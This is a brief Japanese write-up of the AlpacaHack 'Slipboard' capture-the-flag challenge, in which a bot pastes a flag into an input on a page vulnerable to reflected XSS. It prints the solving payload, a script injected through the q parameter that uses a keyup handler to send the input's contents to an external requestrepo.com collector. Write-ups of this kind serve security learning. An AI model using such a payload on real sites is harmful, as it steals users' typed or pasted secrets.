# Slipboard

https://alpacahack.com/daily/challenges/slipboard

## 問題の概要

`/?q=...` に指定した文字列がそのまま HTML に埋め込まれて XSS が可能な Web サービスが動いています。

今回は `bot` が指定した URL を開いた後、`Ctrl + V` でクリップボードから input 要素に一度フラグを貼り付けて、すぐに消してから別の文字列を入力してフォームを送信します。

## 解法

input 要素の `onkeyup` などのイベントを監視して、内容を外部に送信するスクリプトを仕込むと、フラグを盗むことができます。


## 解答に使用した入力

```
?q=<script>input.onkeyup=(e)=>e.key=="Control"%26%26fetch(`https://xxxxxx.requestrepo.com/${input.value}`)</script>
```

実験中にリクエストを投げすぎたためか、webhook.site でリクエストを受け取れなくなってしまったため、代わりに requestrepo.com を使用しました。
